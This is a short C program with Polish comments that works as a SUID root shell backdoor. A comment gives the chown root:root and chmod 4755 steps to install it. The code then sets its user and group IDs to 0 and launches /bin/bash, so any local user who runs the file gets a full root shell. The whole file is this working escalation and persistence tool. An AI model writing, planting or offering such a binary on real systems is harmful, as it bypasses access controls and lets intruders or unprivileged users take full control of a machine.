#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
//Trzeba dodac do pliku wykonywalnego jako root chown root:root plik i chmod 4755 plik
int main() {
  if (geteuid() != 0) {
        fprintf(stderr, "Ten program musi być uruchomiony z ustawionym SUID root.\n");
        return 1;
    }
    if (setuid(0) != 0) {
        perror("setuid nie powiodło się");
        exit(1);
    }
    if (setgid(0) != 0) {
	perror("setgid nie powiodło się ");
	exit(1);
}
    // Uruchom powłokę z pełnymi prawami roota
    execl("/bin/bash", "bash", NULL);

    perror("execl");
    return 1;
}
